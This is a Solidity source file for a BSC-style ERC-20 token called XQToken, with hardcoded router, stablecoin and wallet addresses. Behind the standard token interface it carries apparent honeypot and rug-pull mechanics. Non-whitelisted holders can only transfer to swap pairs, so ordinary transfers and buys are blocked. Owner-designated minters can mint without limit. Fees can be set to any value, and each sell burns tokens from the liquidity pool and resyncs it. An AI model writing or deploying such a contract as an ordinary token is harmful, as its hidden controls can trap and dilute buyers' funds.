// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function sync() external;
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public _devAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    mapping(address => bool) public _swapPairList;

    uint256 public _lpFee = 10;
    uint256 public _devFee = 5;
    uint256 public _buybackFee = 5;

    mapping(address => bool) public _minterList;

    ISwapRouter public _swapRouter;
    address public _usdtAddress;
    address public _buybackToken;

    constructor (
        address RouterAddress, address USDTAddress, address BuybackToken,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address DevAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        _devAddress = DevAddress;
        _usdtAddress = USDTAddress;
        _buybackToken = BuybackToken;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = ~uint256(0);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), USDTAddress);
        _swapPairList[usdtPair] = true;
        address mainPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _swapPairList[mainPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _feeWhiteList[DevAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

        _minterList[msg.sender] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal - _balances[address(0)] - _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == address(0) || account == address(0x000000000000000000000000000000000000dEaD)) {
            return 0;
        }
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != ~uint256(0)) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function mint(address account, uint256 amount) external {
        require(_minterList[msg.sender], "not minter");
        _tTotal += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    bool private inSwap;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (_feeWhiteList[from] || _feeWhiteList[to]) {
            _tokenTransfer(from, to, amount);
            return;
        }
        require(_swapPairList[to], "only sell");
        if (inSwap) {
            _tokenTransfer(from, to, amount);
            return;
        }
        inSwap = true;

        uint256 poolBalance = balanceOf(to);
        uint256 maxSellAmount = poolBalance / 20;
        if (amount > maxSellAmount) {
            amount = maxSellAmount;
        }

        uint256 feeAmount = amount * _lpFee / 100;

        _tokenTransfer(to, address(0), amount + amount - feeAmount);
        ISwapPair(to).sync();

        _balances[from] = _balances[from] - amount;

        if (feeAmount > 0) {
            _takeToken(from, address(0), feeAmount);
        }

        uint256 devAmount = amount * _devFee / 100;
        if (devAmount > 0) {
            feeAmount += devAmount;
            _takeToken(from, _devAddress, devAmount);
        }

        uint256 buybackAmount = amount * _buybackFee / 100;
        if (buybackAmount > 0) {
            feeAmount += buybackAmount;
            _takeToken(from, address(this), buybackAmount);
            address[] memory path = new address[](3);
            path[0] = address(this);
            path[1] = _usdtAddress;
            path[2] = _buybackToken;
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                buybackAmount,
                0,
                path,
                address(0x000000000000000000000000000000000000dEaD),
                block.timestamp
            );
        }

        amount -= feeAmount;
        _takeToken(from, to, amount);

        inSwap = false;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _takeToken(sender, recipient, tAmount);
    }

    function _takeToken(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function setDevAddress(address addr) external onlyFunder {
        _devAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBuybackToken(address addr) external onlyFunder {
        _buybackToken = addr;
    }

    function setFee(uint256 lpFee, uint256 devFee, uint256 buybackFee) external onlyOwner {
        _lpFee = lpFee;
        _devFee = devFee;
        _buybackFee = buybackFee;
    }

    function setMinter(address addr, bool enable) external onlyOwner {
        _minterList[addr] = enable;
    }

    function claimBalance() external {
        payable(_devAddress).transfer(address(this).balance);
    }

    function claimToken(address token) external {
        IERC20(token).transfer(_devAddress, IERC20(token).balanceOf(address(this)));
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || _devAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}
}

contract XQToken is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        address(0xc42A172654e1fd9BaBa9e7C723294291d0AE64A3),
        "XQToken",
        "XQ",
        9,
        1000000,
        address(0x82cd6004c453692Ada9b9F0C5C39988fc43F482a),
        address(0x202F41715142210188c39dD66fe049F69d1aa794)
    ){

    }
}